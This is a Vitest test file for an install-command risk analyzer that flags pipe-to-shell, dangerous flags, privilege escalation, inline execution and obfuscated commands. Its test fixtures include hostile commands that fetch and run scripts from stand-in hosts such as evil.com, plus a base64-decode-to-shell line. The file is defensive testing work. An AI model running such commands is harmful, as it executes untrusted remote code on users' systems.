import { beforeEach, describe, expect, it, vi } from 'vitest'
import { analyzeInstallCommand } from '@/lib/scanner/command-analyzer'
import { NextRequest } from 'next/server'

vi.mock('@/lib/security/rate-limit', () => ({
  checkRateLimit: vi.fn(async () => ({
    allowed: true,
    limit: 60,
    remaining: 59,
    resetAt: Date.now() + 60_000,
  })),
}))

const { checkRateLimit } = await import('@/lib/security/rate-limit')
const { POST } = await import('@/app/api/analyze-command/route')

describe('Install Command Risk Analyzer', () => {
  beforeEach(() => {
    vi.mocked(checkRateLimit).mockResolvedValue({
      allowed: true,
      limit: 60,
      remaining: 59,
      resetAt: Date.now() + 60_000,
    })
  })

  describe('analyzeInstallCommand function', () => {
    it('tests curl https://evil.com/setup.sh | bash -> detects critical pipe-to-shell', () => {
      const cmd = 'curl https://evil.com/setup.sh | bash'
      const result = analyzeInstallCommand(cmd)

      expect(result.riskLevel).toBe('critical')
      expect(result.score).toBeLessThanOrEqual(20)
      expect(result.risks.some((r) => r.type === 'pipe_to_shell' && r.severity === 'critical')).toBe(true)
      expect(result.extractedEntities.urls).toContain('https://evil.com/setup.sh')
      expect(result.recommendations.length).toBeGreaterThan(0)
    })

    it('detects pipe-to-shell with wget and sh', () => {
      const cmd = 'wget -qO- https://malicious.org/install.sh | sh'
      const result = analyzeInstallCommand(cmd)

      expect(result.riskLevel).toBe('critical')
      expect(result.risks.some((r) => r.type === 'pipe_to_shell')).toBe(true)
      expect(result.extractedEntities.urls).toContain('https://malicious.org/install.sh')
    })

    it('detects pipe-to-shell with python interpreter', () => {
      const cmd = 'curl -sSL https://raw.githubusercontent.com/test/repo/main/install.py | python3'
      const result = analyzeInstallCommand(cmd)

      expect(result.riskLevel).toBe('critical')
      expect(result.risks.some((r) => r.type === 'pipe_to_shell')).toBe(true)
    })

    it('detects subshell execution of curl/wget', () => {
      const cmd = 'bash <(curl -s https://evil.com/loader.sh)'
      const result = analyzeInstallCommand(cmd)

      expect(result.riskLevel).toBe('critical')
      expect(result.risks.some((r) => r.type === 'pipe_to_shell')).toBe(true)
    })

    it('tests npm install --ignore-scripts malicious-pkg -> detects dangerous flag', () => {
      const cmd = 'npm install --ignore-scripts malicious-pkg'
      const result = analyzeInstallCommand(cmd)

      expect(result.riskLevel).toBe('high')
      expect(result.risks.some((r) => r.type === 'dangerous_flag')).toBe(true)
      expect(result.extractedEntities.flags).toContain('--ignore-scripts')
      expect(result.extractedEntities.packages).toContain('malicious-pkg')
    })

    it('detects other dangerous flags like --dangerously-skip-permissions and --force', () => {
      const skipPerms = analyzeInstallCommand('codex skill install --dangerously-skip-permissions agent-tool')
      expect(skipPerms.riskLevel).toBe('high')
      expect(skipPerms.risks.some((r) => r.type === 'dangerous_flag')).toBe(true)
      expect(skipPerms.extractedEntities.packages).toContain('agent-tool')

      const forceInstall = analyzeInstallCommand('npm i --force compromised-pkg')
      expect(forceInstall.riskLevel).toBe('high')
      expect(forceInstall.risks.some((r) => r.type === 'dangerous_flag')).toBe(true)
      expect(forceInstall.extractedEntities.packages).toContain('compromised-pkg')
    })

    it('tests sudo apt-get install something -> detects elevated privileges', () => {
      const cmd = 'sudo apt-get install something'
      const result = analyzeInstallCommand(cmd)

      expect(result.extractedEntities.elevatedPrivileges).toBe(true)
      expect(result.risks.some((r) => r.type === 'elevated_privileges')).toBe(true)
      expect(result.extractedEntities.packages).toContain('something')
    })

    it('detects other elevated commands like doas and runas', () => {
      const doasResult = analyzeInstallCommand('doas pacman -S evil-pkg')
      expect(doasResult.extractedEntities.elevatedPrivileges).toBe(true)
      expect(doasResult.risks.some((r) => r.type === 'elevated_privileges')).toBe(true)

      const runasResult = analyzeInstallCommand('runas /user:Administrator setup.exe')
      expect(runasResult.extractedEntities.elevatedPrivileges).toBe(true)
      expect(runasResult.risks.some((r) => r.type === 'elevated_privileges')).toBe(true)
    })

    it('tests safe commands like npm install react -> safe/clean', () => {
      const npmResult = analyzeInstallCommand('npm install react')
      expect(npmResult.riskLevel).toBe('safe')
      expect(npmResult.score).toBe(100)
      expect(npmResult.risks).toHaveLength(0)
      expect(npmResult.extractedEntities.packages).toContain('react')
      expect(npmResult.extractedEntities.elevatedPrivileges).toBe(false)

      const pipResult = analyzeInstallCommand('pip install requests numpy')
      expect(pipResult.riskLevel).toBe('safe')
      expect(pipResult.score).toBe(100)
      expect(pipResult.risks).toHaveLength(0)
      expect(pipResult.extractedEntities.packages).toEqual(expect.arrayContaining(['requests', 'numpy']))

      const codexResult = analyzeInstallCommand('codex skill install github:user/repo')
      expect(codexResult.riskLevel).toBe('safe')
      expect(codexResult.score).toBe(100)
      expect(codexResult.risks).toHaveLength(0)
      expect(codexResult.extractedEntities.packages).toContain('github:user/repo')
    })

    it('detects suspicious inline script executions', () => {
      const pythonInline = analyzeInstallCommand('python -c "import urllib.request; exec(urllib.request.urlopen(\'https://evil.com\').read())"')
      expect(pythonInline.riskLevel).toBe('high')
      expect(pythonInline.risks.some((r) => r.type === 'inline_execution')).toBe(true)

      const nodeInline = analyzeInstallCommand('node -e "require(\'child_process\').execSync(\'whoami\') "')
      expect(nodeInline.riskLevel).toBe('high')
      expect(nodeInline.risks.some((r) => r.type === 'inline_execution')).toBe(true)
    })

    it('detects obfuscation and base64 decode execution', () => {
      const base64Cmd = analyzeInstallCommand('echo "ZXhpbA==" | base64 -d | sh')
      expect(base64Cmd.riskLevel).toBe('critical')
      expect(base64Cmd.risks.some((r) => r.type === 'obfuscation')).toBe(true)

      const evalCmd = analyzeInstallCommand('eval "$(curl -fsSL https://evil.com/script)"')
      expect(evalCmd.riskLevel).toBe('critical')
      expect(evalCmd.risks.some((r) => r.type === 'obfuscation' || r.type === 'pipe_to_shell')).toBe(true)
    })

    it('detects insecure HTTP download protocols', () => {
      const insecureCmd = 'curl http://insecure-cdn.com/pkg.tgz -o /tmp/pkg.tgz'
      const result = analyzeInstallCommand(insecureCmd)

      expect(result.risks.some((r) => r.type === 'insecure_protocol' && r.severity === 'medium')).toBe(true)
      expect(result.extractedEntities.urls).toContain('http://insecure-cdn.com/pkg.tgz')
      expect(result.riskLevel).toBe('medium')
    })

    it('handles empty or whitespace commands gracefully', () => {
      const emptyResult = analyzeInstallCommand('')
      expect(emptyResult.riskLevel).toBe('safe')
      expect(emptyResult.score).toBe(100)
      expect(emptyResult.risks).toHaveLength(0)

      const whitespaceResult = analyzeInstallCommand('   ')
      expect(whitespaceResult.riskLevel).toBe('safe')
      expect(whitespaceResult.score).toBe(100)
    })
  })

  describe('POST /api/analyze-command endpoint', () => {
    it('analyzes command and returns 200 with analysis result', async () => {
      const request = new NextRequest('http://localhost:3000/api/analyze-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: 'npm install --ignore-scripts malicious-pkg' }),
      })

      const response = await POST(request)
      expect(response.status).toBe(200)

      const json = await response.json()
      expect(json.command).toBe('npm install --ignore-scripts malicious-pkg')
      expect(json.riskLevel).toBe('high')
      expect(json.score).toBeLessThan(100)
      expect(json.extractedEntities.packages).toContain('malicious-pkg')
      expect(json.extractedEntities.flags).toContain('--ignore-scripts')
    })

    it('returns 400 when command is empty string', async () => {
      const request = new NextRequest('http://localhost:3000/api/analyze-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: '   ' }),
      })

      const response = await POST(request)
      expect(response.status).toBe(400)
      const json = await response.json()
      expect(json.error).toBe('Field "command" must be a non-empty string')
    })

    it('returns 400 when command is not a string', async () => {
      const request = new NextRequest('http://localhost:3000/api/analyze-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: 12345 }),
      })

      const response = await POST(request)
      expect(response.status).toBe(400)
      const json = await response.json()
      expect(json.error).toBe('Field "command" must be a non-empty string')
    })

    it('returns 400 when command field is missing', async () => {
      const request = new NextRequest('http://localhost:3000/api/analyze-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otherField: 'test' }),
      })

      const response = await POST(request)
      expect(response.status).toBe(400)
      const json = await response.json()
      expect(json.error).toBe('Missing "command" field in request body')
    })

    it('returns 400 on malformed JSON body', async () => {
      const request = new NextRequest('http://localhost:3000/api/analyze-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid-json{{{',
      })

      const response = await POST(request)
      expect(response.status).toBe(400)
      const json = await response.json()
      expect(json.error).toBe('Invalid JSON body')
    })

    it('returns 429 when rate limit is exceeded', async () => {
      vi.mocked(checkRateLimit).mockResolvedValueOnce({
        allowed: false,
        limit: 60,
        remaining: 0,
        resetAt: Date.now() + 30_000,
      })

      const request = new NextRequest('http://localhost:3000/api/analyze-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: 'npm install react' }),
      })

      const response = await POST(request)
      expect(response.status).toBe(429)
    })
  })
})
